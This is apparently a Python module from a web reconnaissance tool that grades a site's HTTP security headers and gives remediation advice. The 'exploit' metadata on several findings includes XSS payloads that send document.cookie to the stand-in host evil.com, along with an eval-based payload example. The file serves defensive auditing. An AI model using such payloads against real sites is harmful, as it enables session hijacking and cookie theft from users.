"""
HTTP security header analyzer for WebRipper Recon.

Evaluates response headers against security best practices and assigns
a letter grade (A-F) with specific findings and remediation advice.
"""

from __future__ import annotations

import time
from typing import Dict, List, Optional

from .base import BaseScanner
from ..models import Finding, ScanResult, Severity


# ---------------------------------------------------------------------------
# Header check definitions
# ---------------------------------------------------------------------------

class _HeaderCheck:
    """Definition of a single header security check."""

    def __init__(self, header: str, missing_severity: Severity, description: str, remediation: str):
        self.header = header
        self.missing_severity = missing_severity
        self.description = description
        self.remediation = remediation


HEADER_CHECKS = [
    _HeaderCheck(
        "Strict-Transport-Security",
        Severity.HIGH,
        "HSTS enforces HTTPS connections, preventing downgrade attacks and cookie hijacking.",
        "Add header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
    ),
    _HeaderCheck(
        "Content-Security-Policy",
        Severity.HIGH,
        "CSP mitigates XSS and data injection attacks by controlling resource loading.",
        "Implement a Content-Security-Policy header. Start with report-only mode to avoid breaking functionality.",
    ),
    _HeaderCheck(
        "X-Frame-Options",
        Severity.MEDIUM,
        "Prevents clickjacking by controlling whether the page can be embedded in frames.",
        "Add header: X-Frame-Options: DENY (or SAMEORIGIN if framing is needed).",
    ),
    _HeaderCheck(
        "X-Content-Type-Options",
        Severity.MEDIUM,
        "Prevents MIME-type sniffing which can lead to security vulnerabilities.",
        "Add header: X-Content-Type-Options: nosniff",
    ),
    _HeaderCheck(
        "Referrer-Policy",
        Severity.LOW,
        "Controls how much referrer information is sent with requests.",
        "Add header: Referrer-Policy: strict-origin-when-cross-origin",
    ),
    _HeaderCheck(
        "Permissions-Policy",
        Severity.LOW,
        "Controls which browser features the page can use (camera, microphone, geolocation, etc.).",
        "Add header: Permissions-Policy: camera=(), microphone=(), geolocation=()",
    ),
]


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------

class HeaderScanner(BaseScanner):
    """Analyzes HTTP security headers and rates their configuration."""

    @property
    def name(self) -> str:
        return "headers"

    @property
    def description(self) -> str:
        return "Analyzes HTTP security headers and rates their configuration"

    def scan(self) -> ScanResult:
        start = time.time()

        # Collect headers from HTML pages (primarily the root page)
        all_headers = self._collect_headers()
        if not all_headers:
            self._log("No response headers captured — skipping header analysis")
            return self._build_result(start, overall_grade="N/A")

        # Use the first (root) page's headers as the primary source
        headers = all_headers[0]
        headers_lower = {k.lower(): v for k, v in headers.items()}
        self._log(f"Analyzing {len(headers)} response headers...")

        checked = []
        present = []
        issue_count = 0

        # Check each required security header
        for check in HEADER_CHECKS:
            checked.append(check.header)
            value = headers_lower.get(check.header.lower())

            if not value:
                issue_count += 1
                # Build exploit metadata based on missing header
                _missing_metadata = {
                    "Strict-Transport-Security": {
                        "exploit": "Attacker performs SSL stripping: intercepts HTTP→HTTPS redirect using tools like sslstrip, rewrites HTTPS links to HTTP, and captures credentials in plaintext on public WiFi.",
                        "impact": "Credential theft via MITM on any unsecured network",
                        "cwe": "CWE-319",
                        "owasp": "A02:2021 Cryptographic Failures",
                        "time_to_exploit": "~5 minutes",
                    },
                    "Content-Security-Policy": {
                        "exploit": "Without CSP, attacker injects <script>document.location='https://evil.com/steal?c='+document.cookie</script> via any XSS vector. No browser policy blocks it.",
                        "impact": "Unrestricted XSS exploitation — cookie theft, keylogging, defacement",
                        "cwe": "CWE-1021",
                        "owasp": "A05:2021 Security Misconfiguration",
                        "time_to_exploit": "~10 minutes",
                    },
                    "X-Frame-Options": {
                        "exploit": "Attacker creates page with invisible iframe loading target site. User clicks through the attacker's overlay, unknowingly performing actions (changing password, deleting account) on the target.",
                        "impact": "Clickjacking — tricking users into unintended actions",
                        "cwe": "CWE-1021",
                        "owasp": "A05:2021 Security Misconfiguration",
                        "time_to_exploit": "~15 minutes",
                    },
                    "X-Content-Type-Options": {
                        "exploit": "Attacker uploads .jpg file containing JavaScript. Browser sniffs MIME type, executes as script. Combined with user-generated content = stored XSS.",
                        "impact": "MIME confusion attacks leading to XSS",
                        "cwe": "CWE-16",
                        "owasp": "A05:2021 Security Misconfiguration",
                        "time_to_exploit": "~10 minutes",
                    },
                    "Referrer-Policy": {
                        "exploit": "Sensitive URL parameters (tokens, session IDs) leak in Referer header when user clicks external links. Attacker logs referrer on their site to capture tokens.",
                        "impact": "Token/session leakage via referrer",
                        "cwe": "CWE-200",
                        "owasp": "A05:2021 Security Misconfiguration",
                        "time_to_exploit": "~10 minutes",
                    },
                    "Permissions-Policy": {
                        "exploit": "Attacker's injected script accesses camera/microphone/geolocation via browser APIs without restriction.",
                        "impact": "Privacy violation — device access via XSS",
                        "cwe": "CWE-250",
                        "owasp": "A05:2021 Security Misconfiguration",
                        "time_to_exploit": "~10 minutes",
                    },
                }
                self._add_finding(Finding(
                    severity=check.missing_severity,
                    category="headers",
                    title=f"Missing: {check.header}",
                    description=check.description,
                    remediation=check.remediation,
                    metadata=_missing_metadata.get(check.header, {}),
                ))
            else:
                present.append(check.header)
                # Check for weak configurations
                self._check_header_quality(check.header, value)

        # Check for information disclosure headers
        self._check_disclosure(headers_lower)

        # Check cookie security
        self._check_cookies(headers_lower)

        # Check CORS
        self._check_cors(headers_lower)

        # Calculate grade
        grade = self._calculate_grade(issue_count + len(self._findings) - issue_count)

        self._log(f"Header analysis complete: grade {grade}, {len(self._findings)} findings")
        return self._build_result(
            start,
            overall_grade=grade,
            checked_headers=checked,
            headers_present=present,
            total_headers=len(headers),
        )

    def _collect_headers(self) -> List[Dict[str, str]]:
        """Collect response headers from HTML pages."""
        result = []
        for f in self._report.files:
            if f.response_headers and f.local_path:
                ct = f.response_headers.get("Content-Type", f.response_headers.get("content-type", ""))
                if "text/html" in ct.lower() or f.url == self._settings.url:
                    result.append(f.response_headers)
        # If no HTML pages found, use any headers available
        if not result:
            for f in self._report.files:
                if f.response_headers:
                    result.append(f.response_headers)
                    break
        return result

    def _check_header_quality(self, header: str, value: str) -> None:
        """Check for weak configurations in present headers."""
        lower_header = header.lower()
        lower_value = value.lower()

        if lower_header == "strict-transport-security":
            if "max-age=" in lower_value:
                import re
                m = re.search(r"max-age=(\d+)", lower_value)
                if m and int(m.group(1)) < 31536000:
                    self._add_finding(Finding(
                        severity=Severity.MEDIUM,
                        category="headers",
                        title="Weak HSTS max-age",
                        description=f"HSTS max-age is {m.group(1)} (recommended: 31536000 = 1 year).",
                        evidence=value,
                        remediation="Set max-age to at least 31536000 (1 year).",
                        metadata={
                            "exploit": "Short HSTS max-age means the policy expires quickly, allowing SSL stripping attacks after expiry.",
                            "impact": "Increased window for MITM attacks",
                            "cwe": "CWE-319",
                            "owasp": "A02:2021",
                            "time_to_exploit": "~5 minutes",
                        },
                    ))
            if "includesubdomains" not in lower_value:
                self._add_finding(Finding(
                    severity=Severity.LOW,
                    category="headers",
                    title="HSTS missing includeSubDomains",
                    description="HSTS does not include subdomains, which may leave them vulnerable.",
                    evidence=value,
                    remediation="Add includeSubDomains to the HSTS header.",
                    metadata={
                        "exploit": "Attacker targets subdomain without HSTS (e.g. api.target.com) for SSL stripping while main domain is protected.",
                        "impact": "Subdomain MITM attacks",
                        "cwe": "CWE-319",
                        "owasp": "A02:2021",
                        "time_to_exploit": "~5 minutes",
                    },
                ))

        elif lower_header == "content-security-policy":
            if "'unsafe-inline'" in lower_value:
                self._add_finding(Finding(
                    severity=Severity.MEDIUM,
                    category="headers",
                    title="CSP allows unsafe-inline",
                    description="Content-Security-Policy allows inline scripts, reducing XSS protection.",
                    evidence=value[:200],
                    remediation="Remove 'unsafe-inline' and use nonces or hashes instead.",
                    metadata={
                        "exploit": "Despite CSP being present, unsafe-inline allows attacker to inject inline <script> tags — the most common XSS vector.",
                        "impact": "XSS protection significantly weakened",
                        "cwe": "CWE-79",
                        "owasp": "A03:2021 Injection",
                        "time_to_exploit": "~10 minutes",
                    },
                ))
            if "'unsafe-eval'" in lower_value:
                self._add_finding(Finding(
                    severity=Severity.MEDIUM,
                    category="headers",
                    title="CSP allows unsafe-eval",
                    description="Content-Security-Policy allows eval(), enabling code injection.",
                    evidence=value[:200],
                    remediation="Remove 'unsafe-eval' from CSP directives.",
                    metadata={
                        "exploit": "Attacker uses eval()-based payloads: eval(atob('bWFsaWNpb3VzX2NvZGU=')) to execute arbitrary code despite CSP.",
                        "impact": "Code injection via eval()",
                        "cwe": "CWE-95",
                        "owasp": "A03:2021 Injection",
                        "time_to_exploit": "~10 minutes",
                    },
                ))
            directives = [d.strip() for d in lower_value.split(";") if d.strip()]
            for d in directives:
                parts = d.split()
                if not parts:
                    continue
                dir_name = parts[0]
                if dir_name in ("default-src", "script-src") and "*" in parts[1:]:
                    self._add_finding(Finding(
                        severity=Severity.HIGH,
                        category="headers",
                        title=f"CSP contains wildcard in {dir_name}",
                        description=f"Content-Security-Policy uses wildcard (*) in {dir_name}, effectively disabling script execution restrictions.",
                        evidence=d[:200],
                        remediation="Replace wildcard sources with specific allowed origins or use nonces/hashes.",
                        metadata={
                            "exploit": f"Wildcard in {dir_name} allows loading scripts from any domain. Attacker injects script from an external server.",
                            "impact": "CSP effectively disabled for scripts — full XSS capability",
                            "cwe": "CWE-79",
                            "owasp": "A05:2021",
                            "time_to_exploit": "~10 minutes",
                        },
                    ))
                    break
            if len(value) > 8192:
                self._add_finding(Finding(
                    severity=Severity.LOW,
                    category="headers",
                    title="Oversized Content-Security-Policy (CSP) Header",
                    description=f"Content-Security-Policy header size is {len(value)} bytes, exceeding standard 8 KB HTTP buffer limits. Standard HTTP clients and proxies fail with 400 Bad Request (LineTooLong) on headers exceeding 8,190 bytes.",
                    evidence=f"Header size: {len(value)} bytes\nDirectives preview: {value[:250]}...",
                    remediation="Refactor CSP using hash-based or nonce-based restrictions ('strict-dynamic') instead of allowlisting dozens of third-party domains, or serve policy directives via HTML meta tags.",
                    metadata={
                        "exploit": "Excessive header size causes denial of service for intermediate proxies, embedded browsers, and strict HTTP clients that reject headers over 8KB.",
                        "impact": "Client DoS, proxy incompatibility, and CSP policy bloat",
                        "cwe": "CWE-400",
                        "owasp": "A05:2021 Security Misconfiguration",
                        "time_to_exploit": "N/A (Reliability/DoS defect)",
                    },
                ))

        elif lower_header == "x-frame-options":
            if lower_value not in ("deny", "sameorigin"):
                self._add_finding(Finding(
                    severity=Severity.MEDIUM,
                    category="headers",
                    title="Weak X-Frame-Options value",
                    description=f"X-Frame-Options is set to '{value}' instead of DENY or SAMEORIGIN.",
                    evidence=value,
                    remediation="Set X-Frame-Options to DENY or SAMEORIGIN.",
                    metadata={
                        "exploit": "Non-standard value is ignored by browsers, providing no clickjacking protection.",
                        "impact": "Clickjacking vulnerability",
                        "cwe": "CWE-1021",
                        "owasp": "A05:2021",
                        "time_to_exploit": "~15 minutes",
                    },
                ))

    def _check_disclosure(self, headers: Dict[str, str]) -> None:
        """Check for server/technology information disclosure."""
        server = headers.get("server", "")
        if server and "/" in server:
            self._add_finding(Finding(
                severity=Severity.MEDIUM,
                category="headers",
                title="Server version disclosure",
                description=f"Server header reveals version information: {server}",
                evidence=server,
                remediation="Remove version information from the Server header.",
                metadata={
                    "exploit": "Attacker looks up known CVEs for the exact server version (e.g. Apache 2.4.49 = CVE-2021-41773 path traversal). Targeted exploit in minutes.",
                    "impact": "Targeted exploitation using version-specific CVEs",
                    "cwe": "CWE-200",
                    "owasp": "A05:2021",
                    "time_to_exploit": "~5 minutes",
                },
            ))

        powered = headers.get("x-powered-by", "")
        if powered:
            self._add_finding(Finding(
                severity=Severity.MEDIUM,
                category="headers",
                title="X-Powered-By disclosure",
                description=f"X-Powered-By header reveals technology: {powered}",
                evidence=powered,
                remediation="Remove the X-Powered-By header.",
                metadata={
                    "exploit": "Reveals technology stack (e.g. PHP 7.4). Attacker searches for version-specific vulnerabilities and misconfigurations.",
                    "impact": "Technology fingerprinting for targeted attacks",
                    "cwe": "CWE-200",
                    "owasp": "A05:2021",
                    "time_to_exploit": "~5 minutes",
                },
            ))

        generator = headers.get("x-generator", "")
        if generator:
            self._add_finding(Finding(
                severity=Severity.LOW,
                category="headers",
                title="X-Generator disclosure",
                description=f"X-Generator header reveals: {generator}",
                evidence=generator,
                remediation="Remove the X-Generator header.",
                metadata={
                    "exploit": "Reveals CMS/framework. Attacker targets known vulnerabilities for that specific version.",
                    "impact": "CMS fingerprinting",
                    "cwe": "CWE-200",
                    "owasp": "A05:2021",
                    "time_to_exploit": "~5 minutes",
                },
            ))

    def _check_cookies(self, headers: Dict[str, str]) -> None:
        """Check Set-Cookie headers for security flags."""
        cookie = headers.get("set-cookie", "")
        if not cookie:
            return

        lower = cookie.lower()
        if "secure" not in lower:
            self._add_finding(Finding(
                severity=Severity.HIGH,
                category="headers",
                title="Cookie missing Secure flag",
                description="Cookies without the Secure flag can be sent over unencrypted HTTP.",
                evidence=cookie[:100],
                remediation="Add the Secure flag to all cookies.",
                metadata={
                    "exploit": "On shared/public WiFi, attacker uses Wireshark/tcpdump to capture HTTP traffic. Session cookies sent over HTTP are captured in plaintext. Attacker replays cookie to hijack session.",
                    "impact": "Session hijacking on unsecured networks",
                    "cwe": "CWE-614",
                    "owasp": "A02:2021",
                    "time_to_exploit": "~5 minutes",
                },
            ))
        if "httponly" not in lower:
            self._add_finding(Finding(
                severity=Severity.HIGH,
                category="headers",
                title="Cookie missing HttpOnly flag",
                description="Cookies without HttpOnly can be accessed by JavaScript (XSS risk).",
                evidence=cookie[:100],
                remediation="Add the HttpOnly flag to session cookies.",
                metadata={
                    "exploit": "XSS payload steals cookies: document.location='https://evil.com/?c='+document.cookie. Without HttpOnly, JavaScript can read all cookies.",
                    "impact": "Cookie theft via any XSS vulnerability",
                    "cwe": "CWE-1004",
                    "owasp": "A05:2021",
                    "time_to_exploit": "~5 minutes",
                },
            ))
        if "samesite" not in lower:
            self._add_finding(Finding(
                severity=Severity.MEDIUM,
                category="headers",
                title="Cookie missing SameSite flag",
                description="Cookies without SameSite may be vulnerable to CSRF attacks.",
                evidence=cookie[:100],
                remediation="Add SameSite=Strict or SameSite=Lax to cookies.",
                metadata={
                    "exploit": "Attacker creates page that auto-submits form to target site. Browser attaches cookies because no SameSite restriction. Works for state-changing actions.",
                    "impact": "CSRF attacks — unauthorized actions on behalf of user",
                    "cwe": "CWE-352",
                    "owasp": "A01:2021",
                    "time_to_exploit": "~15 minutes",
                },
            ))

    def _check_cors(self, headers: Dict[str, str]) -> None:
        """Check CORS configuration."""
        acao = headers.get("access-control-allow-origin", "")
        if acao == "*":
            self._add_finding(Finding(
                severity=Severity.MEDIUM,
                category="headers",
                title="Wildcard CORS policy",
                description="Access-Control-Allow-Origin is set to *, allowing any origin to read public response data.",
                evidence=acao,
                remediation="Restrict CORS to specific trusted origins.",
                metadata={
                    "exploit": "Any website can make cross-origin requests to read unauthenticated API responses. Note that modern browsers disallow credentials when Access-Control-Allow-Origin is '*', but sensitive public API endpoints may still be read.",
                    "impact": "Cross-origin data exposure from accessible API endpoints",
                    "cwe": "CWE-942",
                    "owasp": "A05:2021",
                    "time_to_exploit": "~10 minutes",
                },
            ))

    @staticmethod
    def _calculate_grade(issue_count: int) -> str:
        """Calculate overall header security grade."""
        if issue_count <= 1:
            return "A"
        elif issue_count <= 3:
            return "B"
        elif issue_count <= 5:
            return "C"
        elif issue_count <= 8:
            return "D"
        return "F"
